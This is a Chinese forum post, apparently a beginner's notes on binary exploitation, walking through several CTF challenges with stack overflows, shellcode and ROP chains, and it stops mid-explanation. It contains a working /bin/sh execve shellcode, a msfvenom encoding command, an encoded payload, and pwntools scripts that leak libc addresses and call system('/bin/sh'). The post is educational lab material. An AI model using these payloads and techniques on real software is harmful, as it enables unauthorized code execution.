> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-268709.htm)

> [原创] 新人 PWN 入坑总结 (一)

最近越学越傻，尤其是复杂网络论文看得我实在是难受，就来总结一下自己入坑 PWN 之后学到的各种东西吧。大部分从我自己原来的博客 COPY 过来的。

栈溢出基础 0x01
==========

一、攻防世界的 Hello_World
-------------------

1. 很简单的一个程序，IDA 打开，32 位程序，main 函数 - hello 函数中

![](https://bbs.pediy.com/upload/attach/202108/904686_ZHWAT2DZVSKHX6F.jpg)

```
  

```

buf 距离栈底有 0x12h，而可以读入的数据有 0x64h，所以可以栈溢出。

2.checksec 一下，开了 NX，不能 shellcode，这里也不需要，因为我们的输入并不会被当成指令来执行。

3. 程序中自带后门 getShell 函数，并且有栈溢出，那么直接覆盖 hello 函数的返回地址跳转即可。

![](https://bbs.pediy.com/upload/attach/202108/904686_7PZNZ6F93UD8E94.jpg)

![](https://bbs.pediy.com/upload/attach/202108/904686_GAFZEPK27EPARKD.jpg)

4. 编写 payload:

payload = "a"*(0x12+0x04)   #padding

(其中 0x12 是覆盖掉距离栈底的内容，0x04 是覆盖掉 hello 函数返回的 ebp，之后才是覆盖 hello 函数的返回地址)

payload += p32(0x0804846B)  ## 覆盖返回地址

5. 之后输入，然后 Interactive() 即可。

参考资料：

[https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157](https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157)

Shellcode 用法 0x02  

====================

 一、BSides San Francisco CTF 2017-b_64_b_tuff
--------------------------------------------

1. 常规 checksec 下，只开了 NX，之后 IDA 打开文件之后，有如下语句：

```
#注释头
 
s = (char *)base64_encode((int)buf, v7, v5);
((void (*)(void))v5)();

```

![](https://bbs.pediy.com/upload/attach/202108/904686_NX6WVNZGFDV9K4B.jpg)

这里 v7 是输入的 Buf，v5 是 mmap 分配的内存空间。之后的语句：代表了将 v5 对应的内存空间强制转化为函数指针并且调用，在汇编代码中也可以看出来：这里的 [ebp+var_18] 就是我们输入的 buf 经过编码 base64 编码后存放的地方。

```
#注释头
 
text:0804879C var_18          = dword ptr -18h

```

![](https://bbs.pediy.com/upload/attach/202108/904686_S38RS7J735EPV7F.jpg)

3. 所以我们输入的内容就成了会被执行的汇编代码，也就是可以输入 Shellcode，来执行我们需要的命令。这里可以看一个连接网址，从里面找 shellcode：

[http://shell-storm.org/shellcode/](http://shell-storm.org/shellcode/)

可以通过 linux/x86/sh/bash/execve/shellcode 等等关键词来查找，这里直接给出一个可用的 shellcode:

![](https://bbs.pediy.com/upload/attach/202108/904686_H9YK7TQ4TYWN638.jpg)

```
#注释头

\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80

```

4. 但是有 Base64_encode，所以我们输入的需要会被 base64 编码，而 base64 编码只能由只由 0-9，a-z，A-Z，+，/ 这些字符组成，(这里就是对应的 ascii 转换表中内容) 所以常规的 shellcode 就不合格，我们这里选中的 shellcode 中某些字符就没办法被 base64 编码，所以这里需要用到 msfvenom 来选择一个可用的编码器，将我们常规的 shellcode 编码成可以被 base64 编码的 shellcode。

5. 打开 Linux，输入 msfvenom -l encoders 可以查看编码器，后面有介绍，可以看一下，从中选择一个可用的编码器对 shellcode 进行编码即可。

6. 查到 x86/alpha_mixed 这个编码器可以将我们输入的 shellcode 编码成大小写混合的代码，符合条件。

x86/alpha_mixed low Alpha2 Alphanumeric Mixedcase Encoder

运行编码器的代码如下：

```
#注释头
 
python -c 'import sys; sys.stdout.write("\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")' | msfvenom -p - -e x86/alpha_mixed -a linux -f raw -a x86 --platform linux BufferRegister=EAX -o payload

```

7. 输入这段代码运行之后可以看到当前文件夹目录下生成了一个 payload 文件，文本打开就可以看到编码后的 shellcode:

PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIp1kyigHaX06krqPh6ODoaccXU8ToE2bIbNLIXcHMOpAA

8. 之后需要将这段可以被 Base64 编码的进行 Base64 解码，得到的 shellcode 再被程序中的 Base64 编码后才是我们真正起作用的 shellcode。利用 python 脚本即可。

▲

1.’import sys; sys.stdout.write(“shellcode”)’：这是导入包之后写入编码的 shellcode。

2. 由于 msfvenom 只能从 stdin 中读取，所以使用 Linux 管道符”|” 来使得 shellcode 作为 python 程序的输出。

3. 此外配置编码器为 x86/alpha_mixed，配置目标平台架构等信息，输出到文件名为 payload 的文件中。

4. 由于在 b-64-b-tuff 中是通过指令 call eax 调用 shellcode 的 eax, 所以配置 BufferRegister=EAX。最后即可在 payload 中看到对应的被编码后的代码。这段 shellcode 代码就可以被 base64 编码成我们需要的汇编代码。

参考资料：

[https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157](https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157)

二、CSAW Quals CTF 2017-pilot
---------------------------

1. 常规 check，发现这破程序啥保护也没开，而且还存在 RWX 段：

![](https://bbs.pediy.com/upload/attach/202108/904686_RA9NT28GFSYXJ9M.jpg)

这不瞎搞嘛。之后 IDA 找漏洞，发现栈溢出：

```
#注释头
 
char buf; // [rsp+0h] [rbp-20h]
if ( read(0, &buf, 0x40uLL) > 4 )：

```

2. 这里就可以思考下攻击思路，存在栈溢出，还有 RWX 段，考虑用 shellcode。虽然这个 RWX 段是随机生成的栈，地址没办法确定。再看看程序，发现程序自己给我们泄露了 buf 的栈地址：

![](https://bbs.pediy.com/upload/attach/202108/904686_72VW5PD7Z6N4RNU.jpg)

也就是说紧跟再 location 后面的打印出来的就是 buf 的真实栈地址，这样我们就可以接受该栈地址，然后用栈溢出使得我们的 main 函数返回时可以跳转到对应的 buf 地址上，而 buf 地址上的内容就是我们的输入，也就是输入的 shellcode，这样就可以执行我们的 shellcode 了。

3. 但是写完 shellcode 会发现程序崩溃，这里进入 IDA 调试一下 shellcode。可以发现程序运行过程中，Main 函数 return 执行之后，跳转到 shellcode 的地方，然后运行 shellcode。但是这一过程中，栈顶指向了 main 函数 return 的地址。所以在运行 shellcode 过程中，由于 shellcode 中有一个 push rbx 命令，导致 rsp 向上移动 8 个字节会覆盖掉 shellcode 的首地址。本来这没啥事，毕竟已经进入到 shellcode 当中去了，但是后面还有 push rax 和 push rdi 这两个改变 rsp 的命令，这就导致了 rsp 再次向低地址覆盖了 16 个字节，总共覆盖了 24 个字节。但是我们输入的 shellcode 有 48 个字节，顺序为 shellcode+nop*10+addr_shellcode，也就是扣掉最后 18 个字节，还多出来 6 个字节覆盖掉了我们的执行代码 shellcode 的最后 6 个字节代码，导致我们的 shellcode 没办法完全执行，最终导致程序出错。

4. 由于 read 函数允许我们输入 0x40，也就是 64 个字节，也就是在覆盖掉返回地址之后，我们还能再输入 64-48=16 个字节。由于 push rdi 之后的片段为 8 个字节 (包括了 push rdi)，小于 16 个字节，能够容纳下我们被覆盖掉的 shellcode 的代码，所以这里我们可以考虑用拼接的方式来把 shellcode 完美执行。

9. 现在考虑如何把两段 shellcode 汇编代码连在一起。有 call,return 和 jmp，但是前面两条指令中，call 会 push 进函数地址，而 return 也会修改栈和寄存器的状态，ret 指令的本质是 pop eip，即把当前栈顶的内容作为内存地址进行跳转。所以只能选择 jmp 跳转。

5. 可以查阅 Intel 开发者手册或其他资料找到 jmp 对应的字节码，或者这个程序中带了一条 Jmp 可以加以利用。为 EB，jmp x 总共 2 个字节：EB x.

6. 将两段隔开，从 push rdi 开始，将 push rdi 和之后的代码都挪到下一个地方。这时第一段 shellcode 应该是 22+2(jmp x)=24 个字节，距离下段 shellcode 的距离应该是 48-24=24，也就对应 0x18h，所以总的 shellcode 应该是 shellcode1+EB 18h+shellcode2，这样可以顺利执行需要的 shellcode。

▲jmp 的跳转计算距离是从 jmp 指令下一条开始计算的。

▲shellcode 的两段执行：

1. 需要泄露地址，读取泄露地址：

A.print io.recvuntil("Location:")# 读取到即将泄露地址的地方。

B.shellcode_address_at_stack = int(io.recv()[0:14], 16)# 将泄露出来的地址转换为数字流

C.log.info("Leak stack address = %x", shellcode_address_at_stack)# 将泄露地址尝试输出，观察是否泄露成功。

2. 需要跳转 jmp 命令或者是 return/call，但是 return 会 pop eip，call 会 push eip，都会修改掉栈中的内容。如果 shellcode 的两段执行计算偏移地址的话，可能需要将这两个内容也计算进入。但是 jmp 就不会需要，是直接无条件跳转，所以大多时候选择 jmp 比较好。

参考资料：

[https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157](https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157)

三、Openctf 2016-tyro_shellcode1
------------------------------

1. 常规 checksec，开了 Canary 和 NX，IDA 查找漏洞，找到下列奇怪代码：

```
#注释头
 
v4 = mmap(0, 0x80u, 7, 34, -1, 0);
-----------------------------------------------------------------------------
read(0, v4, 0x20u);
v5 = ((int (*)(void))v4)();

```

可以猜出来是输入到 v4 中，然后 v4 被强制转换成函数指针被调用。查看汇编代码也可以看到：

![](https://bbs.pediy.com/upload/attach/202108/904686_EZ7S9R7YNVH888C.jpg)

这里就没办法判断到底 [esp+34h] 是不是 v4 了，因为 v4 是通过 mmap 申请的一块内存，虽然在栈上，但是并不知道在哪，需要通过调试才能知道，调试之后发现确实是这样。

2. 虽然最开始 checksec 程序，发现开了 NX，那么这不就代表没办法 shellcode 了吗。调试也发现，除了代码段，其它段都没有 X 属性，都不可执行。但是我们看汇编代码，是 call eax，调用的是寄存器，不是程序段，一定可以被调用的，然后 eax 中保存的内容就是我们输入的内容啊，所以直接输入 shellcode 就完事，连栈溢出什么的都不用考虑。

3. 那么直接从 [http://shell-storm.org/shellcode/](http://shell-storm.org/shellcode/)

查找获取就可以。给出一段可用 shellcode:

\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80

由于这段 shellcode 调用的是 int80 来获取 shell 的，所以给出下列介绍

▲int 80h：128 号中断

1. 在 32 位 Linux 中该中断被用于呼叫系统调用程序 system_call()。

2.read(), write(), system()之类的需要内核 “帮忙” 的函数，就是围绕这条指令加上一些额外参数处理，异常处理等代码封装而成的。32 位 linux 系统的内核一共提供了 0~337 号共计 338 种系统调用用以实现不同的功能。

3. 输入的 shellcode 也就汇编成了 EAX = 0Xb = 11，EBX = &(“/bin//sh”), ECX = EDX = 0，等同于执行代码 sys_execve("/bin//sh", 0, 0, 0)，通过 / bin/sh 软链接打开一个 shell。这里 sys_execve 调用的参数就是 ebx 的对应的地址。所以我们可以在没有 system 函数的情况下打开 shell。64 位 linux 系统的汇编指令就是 syscall，调用 sys_execve 需要将 EAX 设置为 0x3B，放置参数的寄存器也和 32 位不同

参考资料：

[https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157](https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157)

ROP 技术 0x03  

==============

一、bugs bunny ctf 2017-pwn150
----------------------------

1. 常规 checksec，可以发现 NX enabled，并且没有 RAX 字段。打开 IDA 后可以看到在 hello 函数中存在栈溢出：

```
#注释头
 
char s; // [rsp+0h] [rbp-50h]
---------------------------------------------------------------
fgets(&s, 192, stdin);

```

然后分析程序，汇编代码什么的，没找到有 call eax 之类的操作，这里就选择 ROP 来 getshell。

2. 由于是 64 位程序，传参方式不同，依次为：rdi, rsi, rdx, rcx, r8, r9, 栈，而我们的目标是跳转 system 函数，让 system 函数读取 binsh 字符串，system 函数又只有一个参数，所以这个参数必然需要在 rdi 中读取。我们的输入是位于栈上，所以需要一个 pop rdi; 和 ret 的操作命令，让我们的输入赋值给 rdi 寄存器。

3. 在哪找 pop rdi; ret; 也是个问题，这里有个工具可以实现 ROPgadget ，在 linux 下可以输入：以下代码来获取代码地址。

```
#注释头
 
ROPgadget --binary pwn150 | grep "pop rdi"

```

4. 然后需要 system 函数的地址，这里 today 函数直接 call 了该函数，所以可以直接用 IDA 在汇编中看到该地址 (行的前缀)。或者先 ctrl + s，在 got.plt 中搜索一下，发现也能找到 system 函数。所以这里获取 system 地址我们可以有两种方法：

①pop rdi 之后，让 ret 指向 today 函数中的 call_system_地址：0x40075F

![](https://bbs.pediy.com/upload/attach/202108/904686_6VWY3S6THZ3ZAP9.jpg)

②pop rdi 之后，让 ret 指向从 elf = ELF('./pwn150') 和 system_addr = p64(elf.symbols['system']) 中找到的地址 system_addr，也就是 plt 表中的地址 (这里其实可以直接在 IDA 中找到)

(但是需要注意的是，这是 64 位程序，system 函数从 rdi 上取值，与栈无关系，所以 call 和直接跳转 plt 差不多，但是如果是 32 位程序，那么布置栈的时候就需要考虑到 plt 表和直接 call system 函数的不同了。如果是直接跳转 plt 表中的地址，那么栈的布置顺序应该是：

**system 函数 - system 函数的返回地址 - sytem 函数的参数。**

但如果是跳转 call system，那么由于 call 指令会自动 push 进 eip，则栈布置应该为：

**call system 函数地址 - system 函数参数。**

两者不太一样，需要加以区分。后面会有 got 表和 plt 的详细讲解)

4. 接下来寻找 binsh 字符串，但是没找到，只有 sh，也可以开 shell。shift+F12 进入字符串后右键在十六进制中同步，之后可以对应看到 sh 的字符地址，由于 sh 之后直接就是结束字符 00，不会往后多读，而只会读取 sh，所以可以直接将该字符串的地址写在 pop rdi 地址后面，直接赋值给 rdi，写进去。

5. 编写 payload，顺序为：payload = padding + pop_rdi_addr + bin_sh_addr + system_addr（或者是 call_system_addr）。

▲由于 64 位程序中通常参数从左到右依次放在 rdi, rsi, rdx, rcx, r8, r9，多出来的参数才会入栈（根据调用约定的方式可能有不同，通常是这样），因此，我们就需要一个给 RDI 赋值的办法。也就是 ROPgadget --pwn150 | grep “pop rdi” 这段代码获取。所以进入 system 中用 call 和 return 直接进都行，参数是从 rdi 中获取的，进去之后栈上的返回地址是啥都没关系，因为已经 getshell，用不到。

▲执行 call func_addr 指令相当于 push eip ;jmp func_addr，而执行 plt 表中地址则相当于只有 jmp func_addr，没有前面的 push eip，所以需要手动设置这个 eip，而 call 则不用。注意这是 32 位程序下，64 位程序下则按照本篇所说，直接 pop rdi 即可。

参考资料：

[https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157](https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157)  

二、LCTF 2016-pwn100
------------------

1. 常规 checksec，开了 NX 保护。打开 IDA，找漏洞，逐次进入后，sub_40068E() 函数中的 sub_40063D 函数中存在栈溢出：

```
#注释头
 
 
char v1; // [rsp+0h] [rbp-40h]
---------------------------------------------
sub_40063D((__int64)&v1, 200);
--------------------------------------------------------------------
for ( i = 0; ; ++i )
{
    result = i;
    if ( (signed int)i >= a2 )
      break;
    read(0, (void *)((signed int)i + a1), 1uLL);
}

```

这里传的是局部变量 v1 的地址，所以进入 sub_40063D 后，修改 a1 指针对应的内存的值其实就是修改之前局部变量 v1 的值，就是传指针。这个函数每次读取一个字节，直到读取满 200 字节，其实就可以直接把它当成 read(v1,200) 完事。

(题外话：汇编代码中当局部变量传参时，需要用到 lea，即：lea     rax, [rbp+var_40]，就是将栈上的变量 var_40 的地址给 rax，然后传参 mov     rdi, rax；利用 rdi 来传函数参数。进入到函数内部后就会有：mov     [rbp+var_18], rdi，也就是在该函数栈上创建一个局部变量来保存传入变量的栈上的地址，也就是之前 var_40 的栈上地址，保存在 [rbp+var_18] 这个局部变量中。这是这个程序中，不同程序可能不太一样。)

2. 所以这个栈溢出的覆盖返回地址应该是 sub_40068E 函数的返回地址，简单远程调试一下，看看 v1 所在栈地址和 rbp 下一地址的距离就是偏移量，为 0x48，看汇编计算就可以得到 0x40+0x8。

3. 现在需要 system 和 binsh，这个程序中这两个都没有带，而只有 Libc 中才有，但是这个程序并没有泄露 Libc 的地址。分析程序发现，程序中. plt 段中导入了 puts 函数，IDA 中函数名那一块可以看到：所以可以用 pwntools 中的 DynELF，调用该 puts 函数，从而泄露出 libc 中 puts 或者 read 的地址。由于大多教程选择泄露 read，所以这里选择泄露 puts 函数在 Libc 中的被加载的地址。这里用 read,setbuf, 甚至__libc_start_main 函数也都可以，因为都导入了 plt 表和外部引用了。

![](https://bbs.pediy.com/upload/attach/202108/904686_MD2FMQC4HT8H9HP.jpg)

4. 开始构造泄露地址的第一段 payload:

```
#注释头
 
payload = "A"*72            #padding
payload += p64(pop_rdi)      
#由于需要向puts传参，所以用到该地址，可以使用ropgadget
#查询ROPgadget --binary pwn100 | grep "pop rdi ; ret"
#或者在万能gadget中的pop r15，用D命令转换成数据后再C命令转换回代码可以看到
payload += p64(puts_got)
#这是puts在.got表(.got.plt段)中的地址，是传递给Puts函数的参数，当该库函数被加载进入libc中
#时，这样传参进去再打印就可以打印出puts函数在libc中的地址，也就泄露出来了。
payload += p64(puts_addr)
#这是调用puts函数，elf.plt['puts']（.plt段）
payload += p64(start_addr)
#整个程序的起始代码段，用以恢复栈。这个函数中会调用main函数。这里用Mian函数地#址也可以
payload = payload.ljust(200, b"B")
#使用B填充200字节中除去先前payload剩余的空间，填充的原因是因为这个程序需要我们输入满200字节
#才会跳出循环，进而才有覆盖返回地址的可能。或者可以写成：
#(payload += 'a'*(200-0x48-32))

```

5. 之后开始运行 payload 来实际得到 Puts 函数被 libc 加载的实际内存地址：

```
#注释头
 
io.send(payload)
io.recvuntil('bye~\n')#跳出循环后才会执行到打印bye的地方
puts_addr = u64(io.recv()[:-1].ljust(8, b'\x00'))
#这里就是接收泄露地址的地方，末尾需要填充上\x00
log.info("puts_addr = %#x", puts_addr)
system_addr = puts_addr - 0xb31e0
log.info("system_addr = %#x", system_addr)

```

6. 现在得到了 puts 函数被 libc 加载的实际内存地址，那么 puts 函数与其它函数的偏移量也就可以通过用 IDA 打开题目给的 libc 查出来，从而得到其它我们需要的函数被 libc 加载的实际内存地址。

```
#注释头
 
00000000000456A0  ---system_in_libc
00000000000F8880 ---read_in_libc
0000000000070920  ---puts_in_libc
000000000018AC40 ---binsh_in_libc

```

得到 libc 被加载的首地址：puts_addr 减去 puts_in_libc 等于 libc_start。于是 libc_start 加上各自函数对应的 in_libc 也就可以得到被 libc 加载的实际内存地址。

7. 现在都有了就可以尝试在执行一次栈溢出来开 shell，64 位程序，有了 system 函数和 binsh 地址，那么栈溢出覆盖用 pop rdi;ret 的方法可以直接 getshell。

8. 这里假设没有 binsh，来使用一下万能 gadget：通过我们的输入读到内存中。同样这张图，万能 Gadget1 为 loc_400616，万能 Gadget2 为 loc_400600

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAACbklEQVRoQ+2aMU4dMRCGZw6RC1CSSyQdLZJtKQ2REgoiRIpQkCYClCYpkgIESQFIpIlkW+IIcIC0gUNwiEFGz+hlmbG9b1nesvGW++zxfP7H4/H6IYzkwZFwQAUZmpJVkSeniFJKA8ASIi7MyfkrRPxjrT1JjZ8MLaXUDiJuzwngn2GJaNd7vyP5IoIYY94Q0fEQIKIPRGS8947zSQTRWh8CwLuBgZx479+2BTkHgBdDAgGAC+fcywoyIFWqInWN9BSONbTmFVp/AeA5o+rjKRJ2XwBYRsRXM4ZXgAg2LAPzOCDTJYQx5pSIVlrC3EI45y611osMTHuQUPUiYpiVooerg7TWRwDAlhSM0TuI+BsD0x4kGCuFSRVzSqkfiLiWmY17EALMbCAlMCmI6IwxZo+INgQYEYKBuW5da00PKikjhNNiiPGm01rrbwDwofGehQjjNcv1SZgddALhlJEgwgJFxDNr7acmjFLqCyJuTd6LEGFttpmkYC91Hrk3s1GZFERMmUT01Xv/sQljjPlMRMsxO6WULwnb2D8FEs4j680wScjO5f3vzrlNJszESWq2LYXJgTzjZm56MCHf3zVBxH1r7ftU1splxxKYHEgoUUpTo+grEf303rPH5hxENJqDKQEJtko2q9zGeeycWy3JhpKhWT8+NM/sufIhBwKI+Mta+7pkfxKMtd8Qtdbcx4dUQZcFCQ2I6DcAnLUpf6YMPxhIDDOuxC4C6djoQUE6+tKpewWZ1wlRkq0qUhXptKTlzv93aI3jWmE0Fz2TeujpX73F9TaKy9CeMk8vZusfBnqZ1g5GqyIdJq+XrqNR5AahKr9CCcxGSwAAAABJRU5ErkJggg==)

以下为用来读取 binsh 字符串的代码，这里需要在程序中找到一段可以写入之后不会被程序自动修改的内存，也就是 binsh_addr=0x60107c，这个地址其实是 extern 的地址，里面原来保存的内容是 read 函数发生延迟绑定之前的地址。而延迟绑定发生之后，got 表中保存的内容已经被改成了被 Libc 加载的真实地址，这个 extern 也就没用了，可以随意用。但如果某个函数没有被首次调用，即还没发生延迟绑定，而我们却先一步改掉了 extern 的内容，那么它就再也没办法被调用了。

```
#注释头
 
 
binsh_addr = 0x60107c        
#bss放了STDIN和STDOUT的FILE结构体，修改会导致程序崩溃
 
payload = b"A"*72
payload += p64(universal_gadget1) #万能gadget1
payload += p64(0) #rbx = 0
payload += p64(1)
#rbp = 1，过掉后面万能gadget2的call返回后的判断,使它步进行跳转，而是顺序执行到万
#能gadget1，从而return到最开始来再执行栈溢出从而Getshell。
#cmp 算术减法运算结果为零,就把ZF(零标志)置1,cmp a b即进行运算a-b
payload += p64(read_got)
#r12 = got表中read函数项，里面是read函数的真正地址，直接通过call调用
payload += p64(8) #r13 = 8，read函数读取的字节数，万能gadget2赋值给rdx
payload += p64(binsh_addr) #r14 = read函数读取/bin/sh保存的地址，万能gadget2赋值给rsi
payload += p64(0)
#r15 = 0，read函数的参数fd，即STDIN，万能gadget2赋值给edi
payload += p64(universal_gadget2) #万能gadget2
payload += b'\x00'*56
#万能gadget2后接判断语句，过掉之后是万能gadget1，而Loc_400616万能gadget1执行之
#后会使得栈空间减少7*8个字节，所以我们需要提前输入7*8来使得万能gadget1执行之
#后栈的位置不发生变化，从而能正常ret之后接上的start_addr
#用于填充栈，这里用A也是一样
payload += p64(start_addr) #跳转到start，恢复栈
payload = payload.ljust(200, b"B") #padding
#不知道这有什么用，去掉一样可以getshell，因为这边是直接调用read函数，而不是经过
#sub_40068E()非得注满200字节才能跳出循环。
 
io.send(payload)
io.send(b"/bin/sh\x00")
#上面的一段payload调用了read函数读取"/bin/sh\x00"，这里发送字符串
#之后回到程序起始位置start

```

这里万能 Gadget 中给 r12 赋值，传入的一定是该函数的 got 表，因为这里的 call 和常规的 call 有点不太一样。我们在 IDA 调试时按下 D 转换成硬编码形式，(这里可以在 IDA 中选项 - 常规 - 反汇编 - 操作码字节数设置为 8) 可以看到这个 call 的硬编码是 FF，而常规的 call 硬编码是 E8。(这里 call 硬编码之后的字节代表的是合并程序段之前的偏移量，具体可以参考静态编译、动态编译、链接方面的知识) 在这个指令集下面：

FF 的 call 后面跟的是地址的地址。例如 call [func], 跳转的地方就应该是 func 这个地址里保存的内容，也就是 * func。

E8 的 call 后面跟的是地址。例如 call func，跳转的地方就是 func 的开头。

![](https://bbs.pediy.com/upload/attach/202108/904686_H4XJKAFNSUAEGEC.jpg)

![](https://bbs.pediy.com/upload/attach/202108/904686_YFPZYTTJQX64HQW.jpg)

这里可以不用非得看硬编码，可以直接看汇编也可以显示出来：一个有 [], 一个没有 []。

![](https://bbs.pediy.com/upload/attach/202108/904686_ZTRMY57Z343FKE4.jpg)

![](https://bbs.pediy.com/upload/attach/202108/904686_UNX6CZFUWZEUAD5.jpg)

9. 所以万能 gadget 中通过 r12，传入跳转函数的地址只能是发生延迟绑定之后的 got 表地址，而不能是 plt 表地址或者是没有发生延迟绑定的 got 表地址，(延迟绑定只能通过 plt 表来操作，没有发生延迟绑定之前，该 got 表中的内容是等同于无效的，只是一个 extern 段的偏移地址，除非该函数 func 是静态编译进程序里面的，那么 got 表中的内容就是该函数的真实有效地址，不会发生延迟绑定。) 因为 plt 表中的内容转换成硬编码压根就不是一个有效地址，更别说跳转到该地址保存的内容的地方了。有人说跳转到 plt 表执行的就是跳转 got 表，那应该是一样的啊，但 FF 的 call 并不是跳转到 plt 来执行里面的代码，而是取 plt 表中内容当作一个地址再跳转到该地址来执行代码，所以有时候需要看汇编代码来决定究竟是传入 got 表还是传入 plt 表。同样也可以看到 plt 表中的硬编码是 FF，也就是并不是跳转 got 表，而是取 got 表中保存的内容当作一个地址再来跳转。

![](https://bbs.pediy.com/upload/attach/202108/904686_UHBVV57JMQPYQCR.jpg)

▲说了这么多，记住一个就行了，

需要跳转函数时，有 [] 的 - 只能传 got 表，没 [] 的 - 传 plt 表(plt 表更安全好使，但后面格式化字符串劫持 got 表又有点不太一样，情况比较复杂)。

需要打印真实函数地址时，传的一定是 got 表，这样就一定没错。

当有 call eax; 这类语句时，eax 中保存的一定得是一个有效地址，因为这里的 call 硬编码也是 0FF。(实际情况 got 和 plt 来回调着用呗，哪个好使用哪个)

10. 那么现在有了 system_addr 和 binsh_addr，而程序又是从最开始运行，所以现在尝试 getshell：

```
#注释头
 
payload = b"A"*72 #padding
payload += p64(pop_rdi) #给system函数传参
payload += p64(binsh_addr) #rdi = &("/bin/sh\x00")
payload += p64(system_addr) #调用system函数执行system("/bin/sh")
payload = payload.ljust(200, b"B") #padding，跳出循环
io.send(payload)
io.interactive()

```

11. 另外由于在 libc 中查找也比较繁琐，所以有个 libcSearch 可以简化使用，具体查资料吧。

▲

1. 往 puts 函数中传入函数在 got 表中的地址（elf.got）参数可以打印出被加载在 Libc 中的实际内存地址。

2. 用覆盖返回地址 ret 的形式调用函数需要用函数在 plt 表中的地址，（elf.plt）这是库函数地址，需要先到 plt 中，然后再到 got 表中，这是正常的函数调用。

3. 但如果在 gadget 中，则可以通过给 r12 赋值来调用 elf.got 表中的函数，因为这个是 call qword ptr[r12+rbx*8]，指向的是函数在 got 表中真实地址，需要的是函数在 got 表中的地址。如果只是 call addr，则应该是 call 函数在 plt 表中的地址。

4. 万能 gadget 一般在_libc_csu_init 中，或者 init 或者直接 ROPgadget 查也可以

▲mov 和 lea 区别：

mov: 对于变量，加不加 [] 都表示取值；对于寄存器而言，无 [] 表示取值，有 [] 表示取地址。

lea: 对于变量，其后面的有无 [] 皆可，都表示取变量地址，相当于指针。对于寄存器而言，无 [] 表示取地址，有 [] 表示取值。

参考资料：

[https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157](https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157)  

三、RedHat 2017-pwn1
------------------

1. 常规 checksec 查看一下，发现开启了 NX，IDA 打开程序找漏洞，变量 V1 的首地址为 bp-28h，即变量在栈上。而之后还有__isoc99_scanf 不限制长度的函数，所以输入会导致栈溢出。这样就可以寻找 system 和”bin/sh” 来 getshell 了。

```
#注释头
 
int v1; // [esp+18h] [ebp-28h]
----------------------------------------------------------
__isoc99_scanf("%s", &v1);

```

2. 首先 ctrl+s 看看. got.plt 中有没有 system 函数，这里有。找到 system 函数后，再寻找”/bin/sh”，但是找不到，所以考虑从__isoc99_scanf 来读取”/bin/sh” 来写入到内存进程中。

3. 接下来考虑字符串”/bin/sh” 应该放到哪里，因为可能会有 ASLR(地址随机化) 的影响，所以最好找个可以固定的内存地址来存放数据。ctrl+s 查看内存页后可以看到有个 0x0804a030 开始的可读可写的大于 8 字节的地址，且该地址不受 ASLR 影响，所以可以考虑把字符串读到这里。(可以看到有 R 和 W 权限，但我也不知道怎么看该地址受不受到 ASLR 的影响，可以按照以前的做法，这里可以将该地址修改为某个 extern 段的地址，因为延迟绑定之后，这个段中的内容就基本没用了，这里选择这个段上的某个地址一样可以 getshell，我选的是 0x0804A050。)

4. 既然程序读取用的是__isoc99_scanf，那么参数”%s” 也得找到，容易找到位于 0x08048629。

5. 先编写 rop 链测试一下：

```
#注释头
 
elf = ELF('./pwn1')#rop链必备，用于打开plt和got表来获取函数地址
scanf_addr = p32(elf.symbols['__isoc99_scanf'])#获取scanf的地址
format_s = p32(0x08048629)#这是我们scanf赋予”%s”的地址
binsh_addr = p32(0x0804a030)#bin/sh保存的地址
 
shellcode = ‘A’*0x34 + scanf_addr + format_s + binsh_addr
print io.read()
#读取puts("pwn test")的输出，以便继续执行。io.recv()一样可以，具体用法再做参考
io.sendline(shellcode1)#第一次scanf输入shellcode1

```

这里 "A"*0x34 有点不一样，我们可以看到在该函数中声明的局部变量 v1 距离栈底有 0x28，那么 main 函数的返回地址应该是 0x28+0x04=0x2c 才对。但是实际上，由于程序最开始的动态链接，是从 start 开始初始化 main 函数栈的，所以经过 start 函数会给 main 函数栈上压入两个全局偏移量。通过调试也可以看到，输入 AAAA, 位于 FFFDF568, 加上 0x28 应该等于 FFFDF590，但是这里却不是 ebp，得再加上两个 0x04 才是 ebp 的位置。这是因为在程序运行起来的延迟绑定的关系，压入栈的是全局偏移。不过不用管，没啥用，这里直接再加上两个 0x04 就好了，通过调试也可以调试出来。而且查汇编代码，发现寻址方式是通过 esp 寻址，也就是 [esp+18h]，FFFDF550+0x18=FFFDF568，也就是我们输入的地方。

![](https://bbs.pediy.com/upload/attach/202108/904686_667P2GVVQB4TSQT.jpg)

6. 程序运行到这没什么问题，但是接着运行下去从由于我们覆盖的是 main 函数的返回地址，让 main 返回地址返回到 scanf 中，执行的是 return 命令。而再次进入到 scanf 函数中之后，执行：io.sendline(“/bin/sh”)。发现 binsh 并没有被读入到 binsh_addr 中，这是因为 scanf 读取输入时的汇编操作如下：假设为 scanf(“%s”,&v1);

```
#注释头
 
push v1
push %s
push eip

```

栈的分布如下：

```
#注释头
 
栈顶
scanf返回地址              ---esp +1
scanf第一个格式化参数%s    ---esp+2
scanf第二个输入进的参数&v1  ---esp+3
 
执行时是取esp +2,esp+3

```

而我们直接 return scanf 的栈分布如下：

```
#注释头
 
scanf 第一个格式化参数%s       ---p32(format_s)   ---esp+1
